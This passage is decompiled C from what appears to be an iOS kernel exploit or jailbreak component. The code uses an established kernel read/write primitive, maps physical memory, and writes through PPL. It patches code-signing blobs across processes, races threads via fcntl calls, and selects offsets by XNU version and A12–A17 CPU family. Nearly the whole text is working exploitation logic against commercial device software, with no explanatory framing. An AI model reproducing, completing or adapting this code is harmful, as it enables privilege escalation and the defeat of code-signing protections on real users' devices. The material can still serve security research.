      v145 = *(uint64_t *)(v2 + 928);
      v104 = *(uint64_t *)(v2 + 912);
      if ( !validate_kaddr_range(v2, v104) )
        goto LABEL_442;
      size_4a = check_krw_read_thunk_ok(v2, v104, (__int64)&v204);
      if ( size_4a )
        goto LABEL_442;
      LOWORD(v204) = u16_add10_clamped((unsigned __int16)v204);
    }
    else
    {
      v145 = 0;
      v104 = 0;
      if ( !v52 )
      {
LABEL_433:
        v136 = fcntl(v208, 59, &v213);
        BYTE1(name[0]) = 1;
        if ( v136 < 0 )
        {
          v138 = errno;
          v110 = errno;
          if ( v138 < 0 )
            v110 = -v110;
          goto LABEL_440;
        }
        if ( !v151
          || v58 != 0
          || ((size_4a = 163856, !(unsigned int)kwrite_u16_at_plus8(v2, v104, v204))
          && (unsigned int)necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 888), v145)) )
        {
          size_4a = 0;
        }
LABEL_442:
        if ( v210 )
        {
          pthread_join(v210, 0);
          v210 = 0;
        }
        v33 = sizea;
        if ( !(uint64_t)v181 )
          goto LABEL_446;
LABEL_445:
        physmap_unmap_cached(v2, (__int64)&v181);
        goto LABEL_446;
      }
    }
    v105 = mach_thread_self();
    if ( !set_thread_abs_realtime_50(v105) )
      goto LABEL_430;
    v106 = mach_thread_self();
    size_4a = kwrite_task_kobj_field_via_physmap((struct_krwCtx *)v2, v106, 1, 1, 1);
    if ( size_4a )
      goto LABEL_442;
    thread_switch(0, 2, 0xAu);
    target_actb = 0;
    if ( !v149 )
    {
LABEL_423:
      if ( !v151 )
      {
LABEL_426:
        if ( v149 )
        {
          size_4a = scan_kernel_page_for_pattern(
                      (struct_krwCtx *)v2,
                      *(uint64_t *)(v2 + 6584),
                      bufSized,
                      v209,
                      (__int64 (__fastcall *)(__int64, __int64))get_dyld_slide_info,
                      0);
          if ( size_4a )
            goto LABEL_442;
          v135 = thread_resume(target_actb);
          if ( v135 )
          {
            v115 = v135 | 0x80000000;
            goto LABEL_441;
          }
          while ( !LOBYTE(name[0]) )
            ;
        }
        v58 = 0;
        goto LABEL_433;
      }
      if ( necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 888), 0) )
      {
        size_4a = scan_kernel_page_for_pattern(
                    (struct_krwCtx *)v2,
                    *(uint64_t *)(v2 + 6576),
                    *(unsigned int *)(v2 + 6592),
                    v104,
                    (__int64 (__fastcall *)(__int64, __int64))dyld_fcntl59_mmap_setup,
                    (__int64)&v208);
        if ( size_4a )
          goto LABEL_442;
        goto LABEL_426;
      }
LABEL_467:
      v115 = 163856;
      goto LABEL_441;
    }
    size_4a = resolve_kfunc_via_page_dispatch(
                (struct_krwCtx *)v2,
                *(uint64_t *)(v2 + 6584),
                bufSized,
                (__int64 *)&v209,
                (__int64 (__fastcall *)(__int64, __int64))get_dyld_slide_info,
                0);
    if ( size_4a )
      goto LABEL_442;
    v246 = 0u;
    v247 = 0u;
    v244 = 0u;
    v245 = 0u;
    v242 = 0u;
    v243 = 0u;
    v240 = 0u;
    v241 = 0u;
    v238 = 0u;
    v239 = 0u;
    v236 = 0u;
    v237 = 0u;
    v234 = 0u;
    v235 = 0u;
    v232 = 0u;
    v233 = 0u;
    v230 = 0u;
    v231 = 0u;
    v228 = 0u;
    v229 = 0u;
    v226 = 0u;
    v227 = 0u;
    v224 = 0u;
    v225 = 0u;
    v222 = 0u;
    v223 = 0u;
    v220 = 0u;
    v221 = 0u;
    v218 = 0u;
    v219 = 0u;
    v216 = 0u;
    v217 = 0u;
    if ( !(unsigned int)kwrite_with_retry(v2, v209, (__int64)&v216, bufSized) )
      goto LABEL_467;
    v107 = pgtable_walk_wrapper(v2, (v209 + 16) & ~*(uint64_t *)(v2 + 392), __src);
    if ( v107 )
    {
      size_4a = physmap_map_cached((struct_krwCtx *)v2, v180 & 0xFFFFFFFFC000LL, (__int64)&v181);
      if ( size_4a )
        goto LABEL_442;
      LOWORD(name[0]) = 0;
      *((uint64_t *)&v175 + 1) = v181 + ((v209 + 16) & *(uint64_t *)(v2 + 392));
      v108 = (void *(__cdecl *)(void *))nullsub_1(spinlock_acquire_clear_bit);
      v109 = pthread_create_suspended_np(&v210, 0, v108, name);
      if ( v109 )
      {
        if ( v109 >= 0 )
          v110 = v109;
        else
          v110 = -v109;
LABEL_440:
        v115 = v110 | 0x40000000;
        goto LABEL_441;
      }
      target_actb = pthread_mach_thread_np(v210);
      if ( set_thread_abs_realtime_50(target_actb) )
      {
        size_4a = kwrite_task_kobj_field_via_physmap((struct_krwCtx *)v2, target_actb, 0, 1, 96);
        if ( size_4a )
          goto LABEL_442;
        goto LABEL_423;
      }
LABEL_430:
      v115 = 163896;
      goto LABEL_441;
    }
    v115 = 163878;
LABEL_441:
    size_4a = v115;
    goto LABEL_442;
  }
  v62 = *(uint64_t *)(v2 + 568);
  v33 = sizea;
  if ( !v62 )
  {
    bufSizeb = v52;
    name[0] = 0;
    if ( !krw_task_for_pid(v2, 1, name) )
    {
      v64 = 163843;
      goto LABEL_254;
    }
    *(uint64_t *)&v216 = 0;
    if ( (unsigned int)walk_proc_and_get_csblob_addr((struct_krwCtx *)v2, name[0], (unsigned __int64 *)&v216) != 1
      || (v75 = walk_task_csblob_chain((struct_krwCtx *)v2, name[0], (__int64 *)&v216, 0, 0)) == 0 )
    {
      mach_port_deallocate(mach_task_self_, name[0]);
      size_4a = 163843;
      v33 = sizea;
      goto LABEL_446;
    }
    v76 = v75;
    *(uint64_t *)(v2 + 568) = v75;
    mach_port_deallocate(mach_task_self_, name[0]);
    v62 = v76;
    v33 = sizea;
    LOBYTE(v52) = bufSizeb;
  }
  v210 = 0;
  *(uint64_t *)&v177 = 0;
  v175 = 0u;
  v176 = 0u;
  *(__int128 *)name = 0u;
  v184 = 0;
  v183 = 0u;
  v182 = 0u;
  v181 = 0u;
  *(uint64_t *)&v220 = 0;
  v218 = 0u;
  v219 = 0u;
  v216 = 0u;
  v217 = 0u;
  v63 = *(uint32_t *)(v2 + 320);
  if ( v63 != 8019 && v63 != 7195 )
  {
    v64 = 163884;
    goto LABEL_254;
  }
  if ( *(uint64_t *)(v2 + 344) > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v64 = 708616;
LABEL_254:
    size_4a = v64;
    goto LABEL_446;
  }
  v144 = v62;
  bufSizec = v52;
  v80 = get_version_specific_offset((struct_krwCtx *)v2);
  size_4a = 163858;
  if ( !v80 )
    goto LABEL_363;
  v81 = v80;
  if ( *(uint64_t *)(v2 + 344) <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
  {
    v81 = voucher_attr_recipe_scan(v2, v80);
    if ( !v81 )
      goto LABEL_363;
  }
  v82 = 1;
  do
  {
    v83 = v82;
    v82 *= 2;
  }
  while ( ((unsigned int)v83 & v81) == 0 );
  v84 = mach_thread_self();
  v85 = get_task_kobject_addr((struct_krwCtx *)v2, v84);
  if ( !v85 )
  {
    v119 = 163877;
LABEL_362:
    size_4a = v119;
    goto LABEL_363;
  }
  *(uint64_t *)target_act = v85 + 152;
  pgtable_walk_wrapper(v2, (v85 + 152) & ~*(uint64_t *)(v2 + 392), (__int64)__src);
  if ( !v86 )
  {
LABEL_361:
    v119 = 163878;
    goto LABEL_362;
  }
  size_4a = physmap_map_cached((struct_krwCtx *)v2, v180 & 0xFFFFFFFFC000LL, (__int64)&v181);
  if ( size_4a )
    goto LABEL_363;
  v148 = 0;
  v150 = 0;
  *((uint64_t *)&v220 + 1) = (*(uint64_t *)(v2 + 392) & *(uint64_t *)target_act) + v181;
  v140 = v83 - 1;
  while ( 1 )
  {
    v87 = **((uint64_t **)&v220 + 1);
    if ( !validate_kaddr_range(v2, **((uint64_t **)&v220 + 1)) || (*(uint64_t *)(v2 + 392) & v87) != 0 )
    {
      size_4a = 163878;
      v88 = v148;
      v89 = v150;
      goto LABEL_223;
    }
    *(uint64_t *)(*((uint64_t *)&v220 + 1) + 8LL) = v87;
    *(uint64_t *)target_acta = v87;
    if ( v87 != v148 )
    {
      if ( *(uint64_t *)name )
        physmap_unmap_cached(v2, (__int64)name);
      pgtable_walk_wrapper(v2, v87, (__int64)__src);
      if ( !v91 )
        goto LABEL_361;
      size_4a = physmap_map_cached((struct_krwCtx *)v2, v180 & 0xFFFFFFFFC000LL, (__int64)name);
      if ( size_4a )
        goto LABEL_363;
    }
    LOWORD(v216) = 0;
    *(uint64_t *)&v218 = v87;
    *((uint64_t *)&v216 + 1) = *(uint64_t *)name;
    *(uint64_t *)&v217 = v144;
    BYTE8(v218) = bufSizec;
    *(uint64_t *)&v219 = v140;
    DWORD2(v219) = *(uint32_t *)(v2 + 576);
    v92 = (void *(__cdecl *)(void *))nullsub_1(scan_iosurface_slot_realtime);
    v93 = pthread_create(&v210, 0, v92, &v216);
    if ( v93 )
    {
      if ( v93 >= 0 )
        v132 = v93;
      else
        v132 = -v93;
      v119 = v132 | 0x40000000;
      goto LABEL_362;
    }
    while ( !(uint8_t)v216 )
      ;
    v94 = fcntl(v31, 59, &v213);
    BYTE1(v216) = 1;
    if ( (v94 & 0x80000000) == 0 )
      break;
    v95 = errno;
    v96 = errno;
    if ( v95 >= 0 )
      v97 = v96;
    else
      v97 = -v96;
    if ( v150 && !(v150 % 5) )
      semaphore_timedwait_ns(v2, 0x3E8u);
    if ( v150 <= 3 )
    {
      v90 = v150 + 1;
      v88 = *(uint64_t *)target_acta;
      goto LABEL_224;
    }
    size_4a = v97 | 0x40000000;
    *(uint32_t *)(v2 + 576) = 0;
    v89 = v150;
    v88 = *(uint64_t *)target_acta;
LABEL_223:
    v90 = v89 + 1;
    if ( v90 == 128 )
      goto LABEL_363;
LABEL_224:
    v150 = v90;
    v148 = v88;
    if ( v210 )
    {
      pthread_join(v210, 0);
      v210 = 0;
    }
  }
  size_4a = 0;
  if ( HIDWORD(v219) )
    *(uint32_t *)(v2 + 576) = HIDWORD(v219);
LABEL_363:
  if ( v210 )
  {
    pthread_join(v210, 0);
    v210 = 0;
  }
  v33 = sizea;
  if ( *(uint64_t *)name )
    physmap_unmap_cached(v2, (__int64)name);
  if ( (uint64_t)v181 )
    goto LABEL_445;
LABEL_446:
  if ( !bufSize_4a )
  {
    if ( size_4a )
      goto LABEL_451;
    goto LABEL_59;
  }
  v120 = 5;
  if ( (unsigned int)physmap_kwrite_chain_entry((struct_krwCtx *)v2, *((uint64_t *)v3 + 4), v164, &v171, 1) && !size_4a )
  {
LABEL_59:
    v204 = v170;
    if ( !(unsigned int)csblob_chain_walk_offsets((struct_krwCtx *)v2, v3[17], (__int64 *)&v204, 1u, (__int64)&v195) )
      goto LABEL_451;
    if ( bufa < 0 )
    {
      if ( v195 != *v3 )
      {
        v39 = 16;
        if ( *(uint64_t *)(v2 + 344) > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v39 = 32;
        if ( !(unsigned int)kwritebuf_universal((uint64_t *)v2, v39 + v196, v3, 4u) )
          goto LABEL_451;
      }
      v40 = v3[20];
      if ( (v201 == 0) == (v40 != 0) )
      {
        v69 = v33;
        v70 = *(uint64_t *)(v2 + 344);
        v71 = 128;
        if ( v70 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v71 = 136;
        bufc = v71;
        v72 = csblob_find_entry((struct csblob_walk_ctx *)&v195, v199, -86111230);
        if ( !v72 )
          goto LABEL_451;
        if ( v40 )
        {
          if ( bswap32(v72[2]) >> 9 < 0x101 )
            goto LABEL_451;
          v73 = v72[12];
          if ( !v73 )
            goto LABEL_451;
          v74 = v197 + v200 + bswap32(v73);
        }
        else
        {
          v74 = 0;
        }
        v5 = v70 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
        v33 = v69;
        if ( v5 || (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 || !v74 )
        {
          if ( !kwrite64_dispatch((struct_krwCtx *)v2, v196 + bufc, v74) )
            goto LABEL_451;
        }
      }
      v27 = v33 & 1;
      v3 = &v195;
      goto LABEL_88;
    }
    v27 = v33 & 1;
    v3 = &v195;
    v9 = v170;
LABEL_51:
    v28 = v205;
    if ( (unsigned __int64)v205 > *((uint64_t *)v3 + 2) )
      goto LABEL_451;
    v170 = v9;
    v29 = krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK);
    v30 = *((uint64_t *)v3 + 3);
    if ( v29 )
    {
      if ( !(unsigned int)ppl_kwritebuf(v2, v30, v207, (int)v28) )
        goto LABEL_451;
    }
    else if ( !(unsigned int)kwritebuf_universal((uint64_t *)v2, v30, v207, (mach_vm_size_t)v28) )
    {
      goto LABEL_451;
    }
LABEL_88:
    if ( v202 != v170 )
    {
      if ( !(unsigned int)proc_kread_and_patch_slot((struct_krwCtx *)v2, v3[17], v202) )
        goto LABEL_451;
      v202 = v170;
      if ( !(unsigned int)kwrite_with_retry(v2, v8, (__int64)&v202, 8) )
        goto LABEL_451;
      v41 = *(uint64_t *)(v2 + 344);
      if ( v41 < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) || ((v27 ^ 1) & 1) != 0 )
        goto LABEL_90;
      if ( !(unsigned int)necp_set_opt_string_6(v2, v3[17]) )
        goto LABEL_451;
      v45 = *(uint64_t *)(v2 + 344);
      if ( (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 && v45 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      {
        if ( !(unsigned int)patch_csblob_in_all_procs((struct_krwCtx *)v2, v3[17], *(uint64_t *)(v2 + 912)) )
          goto LABEL_451;
      }
      else
      {
        v77 = 168;
        if ( v45 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v77 = 160;
        if ( !kread_physmap_decorated((struct_krwCtx *)v2, *((uint64_t *)v3 + 1) + v77, (unsigned __int64 *)&v216) )
          goto LABEL_451;
        if ( *(uint64_t *)(v2 + 912) != (uint64_t)v216 )
        {
          if ( (unsigned int)kread_and_kwrite_u16_plus8_bumped(v2, v216) )
            goto LABEL_451;
          necp_set_opt_string_7((struct_krwCtx *)v2, *(uint32_t *)(v2 + 888), v216);
          if ( !v78 )
            goto LABEL_451;
          if ( *(int *)(v2 + 320) >= 10002 )
          {
            v79 = get_kobj_and_resolve_kaddr((struct_krwCtx *)v2, v3[17], 0);
            if ( !v79 || !(unsigned int)vm_attr_increment_offset_bounded((struct_krwCtx *)v2, v79, 16) )
              goto LABEL_451;
          }
        }
      }
    }
    v41 = *(uint64_t *)(v2 + 344);
LABEL_90:
    if ( v41 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) == 0 )
      goto LABEL_335;
    v42 = v3[17];
    v43 = *((uint64_t *)v3 + 1);
    *(uint64_t *)&v216 = v43;
    *(uint64_t *)name = 0;
    *(uint64_t *)&v181 = 0;
    __src[0] = 0;
    if ( v41 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    {
      v44 = 192;
    }
    else if ( *(int *)(v2 + 320) <= 8791 )
    {
      v44 = 176;
    }
    else
    {
      v44 = 184;
    }
    if ( !kread_physmap_decorated((struct_krwCtx *)v2, v44 + v43, (unsigned __int64 *)&v181) )
      goto LABEL_451;
    if ( !(uint64_t)v181 )
      goto LABEL_451;
    if ( !validate_kaddr_range(v2, v181) )
      goto LABEL_451;
    v65 = task_struct_field_kread((struct_krwCtx *)v2, v42);
    if ( !v65 )
      goto LABEL_451;
    v66 = v65;
    if ( krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    {
      v210 = 0;
      if ( !kread_physmap_decorated((struct_krwCtx *)v2, v66 + 176, (unsigned __int64 *)&v210)
        || !v210
        || !validate_kaddr_range(v2, (__int64)v210)
        || !kread_physmap_decorated((struct_krwCtx *)v2, (unsigned __int64)&v210->__opaque[48], (unsigned __int64 *)name) )
      {
        goto LABEL_451;
      }
      v67 = 32;
    }
    else
    {
      if ( krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK) )
      {
        v116 = 144;
      }
      else
      {
        if ( !krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_CPU_A12_A13_MASK) )
          goto LABEL_451;
        v116 = 136;
      }
      if ( !kread_physmap_decorated((struct_krwCtx *)v2, v116 + v66, (unsigned __int64 *)name) )
        goto LABEL_451;
      v67 = 40;
    }
    if ( !*(uint64_t *)name
      || !validate_kaddr_range(v2, *(__int64 *)name)
      || !kread_physmap_decorated((struct_krwCtx *)v2, *(uint64_t *)name + v67, __src)
      || !__src[0]
      || !validate_kaddr_range(v2, __src[0]) )
    {
      goto LABEL_451;
    }
    if ( __src[0] == (uint64_t)v181 )
    {
LABEL_335:
      v120 = 0;
      goto LABEL_452;
    }
    v211 = 0;
    v206 = 0;
    v203 = 0;
    v209 = 0;
    v210 = 0;
    newBytes = 0xFFFFFFFFLL;
    v208 = 0;
    if ( krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    {
      v124 = 20;
      goto LABEL_373;
    }
    v133 = *(uint32_t *)(v2 + 320);
    if ( v133 <= 8791 )
    {
      v124 = 160;
      if ( (unsigned int)(v133 - 8019) >= 2 && v133 != 6153 && v133 != 7195 )
        goto LABEL_451;
      goto LABEL_373;
    }
    if ( v133 == 10002 || v133 == 8796 )
    {
      v124 = 496;
LABEL_373:
      if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v181 + v124, 4, &newBytes) )
        goto LABEL_451;
      if ( (unsigned int)newBytes > 0x400 )
        goto LABEL_451;
      LODWORD(newBytes) = newBytes + 1;
      if ( !(unsigned int)ppl_kwritebuf(v2, v181 + v124, &newBytes, 4) )
        goto LABEL_451;
      if ( !ppl_kwrite_physmap_checked((struct_krwCtx *)v2, *(uint64_t *)name + v67, v181) )
        goto LABEL_451;
      if ( !krw_ctx_has_flag((struct_krwCtx *)v2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
      {
        __src[0] = v181;
        v126 = kread_task_struct((struct_krwCtx *)v2, v42);
        if ( !v126 )
          goto LABEL_451;
        v127 = v126;
        if ( !(unsigned int)get_csblob_offset_pair(v2, (int *)&v211, (int *)&v206) )
          goto LABEL_451;
        if ( !kread_physmap_decorated((struct_krwCtx *)v2, v127 + v211, &v209) )
          goto LABEL_451;
        if ( !v209 )
          goto LABEL_451;
        if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v127 + v206, 8, &v210) )
          goto LABEL_451;
        if ( !(unsigned int)get_csblob_size_pair(v2, &v203, (uint32_t *)&newBytes + 1) )
          goto LABEL_451;
        if ( !kread_physmap_decorated((struct_krwCtx *)v2, v209 + (unsigned int)v203, &v208) )
          goto LABEL_451;
        if ( !v208 )
          goto LABEL_451;
        if ( !kread_physmap_decorated((struct_krwCtx *)v2, v208 + HIDWORD(newBytes), (unsigned __int64 *)&v216) )
          goto LABEL_451;
        v128 = v216;
        if ( !(uint64_t)v216 )
          goto LABEL_451;
        while ( kread_physmap_decorated((struct_krwCtx *)v2, v128 + v44, (unsigned __int64 *)&v181)
             && (uint64_t)v181
             && validate_kaddr_range(v2, v181) )
        {
          if ( (uint64_t)v181 == __src[0] )
          {
            v186 = 0;
            if ( *(uint64_t *)(v2 + 344) <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || (*(uint32_t *)v2 & KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) == 0 )
              break;
            v129 = *(int *)(v2 + 320) <= 8791 ? 80LL : 400LL;
            v130 = v129 + v181;
            if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)v2, v129 + v181, 1, &v185)
              || v185 > 1u
              || (v185 && !(unsigned int)ppl_kwritebuf(v2, v130, &v186, 1)) )
            {
              break;
            }
          }
          v131 = kread_physmap_decorated((struct_krwCtx *)v2, v216, (unsigned __int64 *)&v216);
          v128 = v216;
          if ( !v131 || !(uint64_t)v216 )
            goto LABEL_470;
        }
        v128 = v216;
LABEL_470:
        if ( v128 )
          goto LABEL_451;
      }
      goto LABEL_335;
    }
    if ( v133 == 8792 )
    {
      v124 = 480;
      goto LABEL_373;
    }
LABEL_451:
    v120 = 5;
  }
LABEL_452:
  if ( v198 != -1 )
    csblob_free_entry((struct csblob_walk_ctx *)&v195);
  v139 = v193;
  if ( v193 != -1 )
  {
    if ( v188 && v189 && !kwrite64(v2, v188, v189) )
      v120 = 5;
    close(v139);
  }
  if ( v207 )
    free(v207);
  v123 = v120 == 0;
LABEL_463:
  v12 = v123;
LABEL_466:
  args->result = v12;
}
// 30824: variable 'v78' is possibly undefined
// 308F8: variable 'v86' is possibly undefined
// 309E8: variable 'v91' is possibly undefined
// 30D14: variable 'v103' is possibly undefined
// 30EC8: variable 'v107' is possibly undefined
// 31428: variable 'v125' is possibly undefined
// 316C0: variable 'v134' is possibly undefined
// 317C0: variable 'v137' is possibly undefined
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

